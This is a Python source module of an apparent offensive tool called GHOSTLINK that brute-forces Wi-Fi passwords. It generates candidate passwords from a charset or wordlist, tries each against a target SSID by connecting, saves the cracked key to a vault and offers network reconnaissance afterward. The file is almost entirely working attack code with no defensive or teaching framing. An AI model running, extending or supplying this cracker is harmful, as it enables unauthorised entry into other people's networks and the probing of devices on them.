"""
GHOSTLINK Brute-Force Engine (Bullet‑Proof + Recon)
=====================================================
Serial connection logic – zero false positives.
Optionally launches network reconnaissance after cracking.
"""

import threading
import time
from typing import Dict, Optional, Tuple

from ..core.colors import C
from ..core.constants import DEFAULT_TIMEOUT
from ..network.connector import WiFiConnector
from ..storage.vault import PasswordVault
from .generator import PasswordGenerator


class AttackState:
    def __init__(self):
        self.lock = threading.Lock()
        self.current_password = ""
        self.attempts = 0
        self.status = "IDLE"
        self.found_password = None
        self.start_time = 0.0
        self.speed = 0.0
        self.verified = False

    def update(self, password: str, increment: bool = True):
        with self.lock:
            self.current_password = password
            if increment:
                self.attempts += 1
                if self.start_time > 0:
                    elapsed = time.time() - self.start_time
                    if elapsed > 0:
                        self.speed = self.attempts / elapsed


# ── Shared global state for the GUI to monitor ─────────────
shared_state = AttackState()


class BruteForceEngine:
    def __init__(self, config: Dict, vault: PasswordVault):
        self.config = config
        self.vault = vault
        self.state = shared_state   # use the module‑level instance so the GUI can see it
        self.stop_flag = threading.Event()
        self.connector = WiFiConnector()
        self.conn_lock = threading.Lock()       # serialise all connection attempts

    # ------------------------------------------------------------------
    # Main execution
    # ------------------------------------------------------------------
    def execute(self) -> Tuple[Optional[str], int, float, bool]:
        ssid = self.config["ssid"]
        charset = self.config["charset"]
        min_len = self.config["minlen"]
        max_len = self.config["maxlen"]
        wordlist = self.config.get("wordlist")
        timeout = self.config.get("timeout", DEFAULT_TIMEOUT)
        skip_cached = self.config.get("skip_cached", True)

        self.state.status = "RUNNING"

        # --- cached password (strict) ---
        if not skip_cached:
            cached = self.vault.get(ssid)
            if cached:
                print(f"\n[CYAN][*] Testing cached password: {cached}[/CYAN]")
                if self._attempt_connection(ssid, cached, timeout):
                    print(f"{C.GREEN}[+] Cached password works and connection kept alive.{C.RESET}")
                    self.state.status = "FOUND"
                    self.state.found_password = cached
                    self.state.verified = True
                    return cached, 0, 0, True
                else:
                    print(f"[YELLOW][!] Cached password failed – removing from vault[/YELLOW]")
                    self.vault.remove(ssid)

        # --- Build password iterator ---
        print(f"\n[CYAN][*] Building attack pipeline...[/CYAN]")
        # If charset is purely numeric, skip common patterns → sequential
        if all(c in '0123456789' for c in charset):
            base_iter = PasswordGenerator.brute_force(charset, min_len, max_len)
        else:
            base_iter = PasswordGenerator.hybrid(charset, min_len, max_len, wordlist)

        # Thread‑safe queue
        queue = []
        queue_lock = threading.Lock()
        queue_exhausted = threading.Event()

        def fill_queue():
            try:
                for pwd in base_iter:
                    with queue_lock:
                        queue.append(pwd)
                    if len(queue) > 100:
                        time.sleep(0.01)           # small back‑pressure
                queue_exhausted.set()
            except Exception as e:
                print(f"Generator error: {e}")
                queue_exhausted.set()

        filler_thread = threading.Thread(target=fill_queue, daemon=True)
        filler_thread.start()

        self.state.start_time = time.time()
        self.stop_flag.clear()

        print(f"[CYAN][*] Workers generate passwords; main thread handles connections[/CYAN]")
        print(f"[CYAN][*] Target: {ssid}[/CYAN]")
        print(f"[CYAN][*] Charset: {charset[:30]}... ({len(charset)} chars)[/CYAN]")
        print(f"[CYAN][*] Length: {min_len}-{max_len}[/CYAN]\n")

        # Dashboard
        dashboard_thread = threading.Thread(target=self._dashboard_worker, daemon=True)
        dashboard_thread.start()

        # ---- MAIN CONNECTION LOOP (serial) ----
        while not self.stop_flag.is_set() and not (queue_exhausted.is_set() and not queue):
            with queue_lock:
                if queue:
                    password = queue.pop(0)
                else:
                    time.sleep(0.05)
                    continue

            self.state.update(password)

            if self._attempt_connection(ssid, password, timeout):
                self.state.status = "FOUND"
                self.state.found_password = password
                self.state.verified = True
                self.vault.set(ssid, password, verified=True)
                elapsed = time.time() - self.state.start_time
                self.stop_flag.set()
                return password, self.state.attempts, elapsed, True

            if self.state.attempts % 100 == 0:
                print(f"\r[*] {self.state.attempts} attempts | "
                      f"Current: {password[:30]} | "
                      f"Speed: {self.state.speed:.1f}/s", end="", flush=True)

        elapsed = time.time() - self.state.start_time
        self.stop_flag.set()
        self.state.status = "STOPPED"
        return None, self.state.attempts, elapsed, False

    # ------------------------------------------------------------------
    # Connection helpers
    # ------------------------------------------------------------------
    def _attempt_connection(self, ssid: str, password: str, timeout: int) -> bool:
        """
        Strict single connection attempt – must connect AND get a valid IP.
        No fallback to pre‑existing connections.
        """
        with self.conn_lock:
            self.connector.disconnect()
            for _ in range(5):
                if not self.connector.is_connected(ssid):
                    break
                time.sleep(1)

            result = self.connector.connect(ssid, password, timeout, cleanup=False)
            if result and self.connector.has_valid_ip():
                return True
            if result:
                print(f"    {C.YELLOW}[!] Connected but no valid IP – rejecting.{C.RESET}")
            return False

    def _offer_recon(self):
        """After a successful crack, offer to run network reconnaissance."""
        try:
            print(f"\n{C.GREEN}[+] Connected to target network.{C.RESET}")
            choice = input(f"{C.CYAN}Run network reconnaissance? [Y/n]: {C.RESET}").strip().lower()
            if choice in ('', 'y'):
                from ..network.recon import full_network_recon
                full_network_recon()
        except Exception as e:
            print(f"{C.RED}[!] Reconnaissance failed: {e}{C.RESET}")

    def _dashboard_worker(self):
        spinner = ["|", "/", "-", "\\"]
        i = 0
        while not self.stop_flag.is_set():
            if self.state.attempts > 0:
                elapsed = time.time() - self.state.start_time
                speed = self.state.attempts / max(elapsed, 0.1)
                sys_line = (
                    f"\r[{spinner[i % 4]}] "
                    f"Trying: {self.state.current_password[:25]:<25} | "
                    f"Attempts: {self.state.attempts:<8} | "
                    f"Speed: {speed:.1f}/s"
                )
                print(sys_line, end="", flush=True)
            i += 1
            time.sleep(0.2)